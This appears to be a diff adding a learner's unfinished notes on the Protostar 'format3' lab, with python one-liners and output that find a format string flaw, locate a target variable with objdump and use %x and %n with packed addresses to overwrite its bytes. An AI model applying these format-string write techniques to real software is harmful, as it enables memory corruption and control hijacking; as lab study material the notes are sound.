@@ -1,0 +1,40 @@
+1. Find format string vulnerability.
+
+python -c 'print "AAAA" + "BBBB" + "%x " * 12' | ./format3
+
+2. Clean overwrite with last format specifier.
+
+python -c 'print "AAAA" + "BBBB" + "%x " * 12 + "%x "' | ./format3
+
+3. Find target
+
+#: objdump -t ./format3 | grep target
+080496f4 g     O .bss	00000004              target
+
+\xf4\x96\x04\x08
+
+4. Inject shellcode
+
+user@protostar:/opt/protostar/bin$ python -c 'print "AAAA" + "\xf4\x96\x04\x08" + "%x " * 12 + "%n "' | ./format3
+AAAA��0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141  
+target is 00000059 :(
+
+We need target to match 0x01025544 "\x44\x55\x02\x01"
+
+
+5. Adjacent memory addresses change target value.
+
+er@protostar:/opt/protostar/bin$ python -c 'print "AAAA" + "\xf7\x96\x04\x08AAAA" + "%x " * 12 + "%n "' | ./format3
+
+python -c 'print "\xf4\x96\x04\x08" + "\xf4\x96\x04\x08AAAA" + "%x " * 9 + "%n %n %n "' | ./format3
+
+target is 5d000000 :(
+
+python -c 'print "AAAA" + "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "\xf7\x96\x04\x08" + "%x " * 12 + "%n%n%n%n "' | ./format3
+
+target is 65656565 :(
+
+I can manipulate all 4 bytes of target variable. We need to match the numbers
+before cmp
+
+6.
